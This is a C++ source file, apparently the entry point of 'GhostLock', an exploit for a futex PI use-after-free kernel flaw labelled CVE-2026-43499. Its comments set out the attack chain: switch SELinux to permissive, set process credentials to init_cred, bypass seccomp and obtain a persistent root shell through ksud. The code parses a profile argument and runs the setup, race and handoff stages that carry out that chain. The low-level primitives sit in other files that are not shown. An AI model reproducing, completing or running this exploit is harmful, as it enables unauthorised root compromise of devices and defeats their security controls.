/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
 * independent root shell: ksud late-load + module watch.
 *
 * This translation unit is the thin adapter: parse, run the stage sequence and
 * map the outcome to the process exit code. Setup, attack primitives, victim
 * protocol and stage policy live in their own units under ghostlock::ops,
 * ghostlock::victim, ghostlock::race and ghostlock::stages.
 */

#include "session/exploit_stages.hpp"

namespace {
using ghostlock::stages::StageResult;
}  // namespace

/* Decoupling plan: top-level lifecycle and W1/W2/W3 orchestration. Inputs:
 * argv/environment snapshot; output: stable process exit code. Future:
 * exploit_session_run(ExploitSession *), delegating profile, heap, race, route,
 * victim and cleanup responsibilities to their contexts. */
int run_exploit(ghostlock::ExploitSession &session, const char *profile_path) {
    if (ghostlock::stages::run_setup_stage(profile_path) == StageResult::Failed)
        return 1;

    if (runtime_config_snapshot().multicast_phase1_probe) {
        if (!ghostlock::support::kernel5_route_selected()) {
            pr_error("5.x phase-1 probe requested for a non-5.x profile\n");
            return 1;
        }
        pr_info("5.x phase-1 probe: cycle/stamp/adjust/disarm only\n");
        int ok = ghostlock::route::kernel5_resident_start();
        if (ok) ghostlock::route::kernel5_resident_stop();
        pr_info("5.x phase-1 probe result=%s\n", ok ? "pass" : "fail");
        return ok ? 0 : 1;
    }

    switch (ghostlock::stages::run_w1_stage(session)) {
        case StageResult::Failed:
            return 1;
        case StageResult::Done:
            return 0;
        case StageResult::Continue:
            break;
    }

    ghostlock::stages::VictimChain chain;
    if (ghostlock::stages::run_w2_w3_chain(session, &chain) ==
            StageResult::Failed)
        return 1;
    return ghostlock::stages::run_handoff_stage(session, chain) ==
                    StageResult::Failed
            ? 1 : 0;
}

/* Decoupling plan: native executable adapter. Inputs: argc/argv; output: stable
 * exit code. Future: remain a thin adapter around ExploitSession lifecycle. */
/* Argument parsing stays in the adapter so the exploit entry only owns the
 * process-level session, the run and the exit code. */
int main(int argc, char **argv) {
    const char *profile_path = NULL;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--profile") == 0 && i + 1 < argc) {
            profile_path = argv[++i];
        } else {
            pr_error("usage: %s --profile <resolved-profile.json>\n", argv[0]);
            return 1;
        }
    }
    return run_exploit(ghostlock::g_exploit_session, profile_path);
}
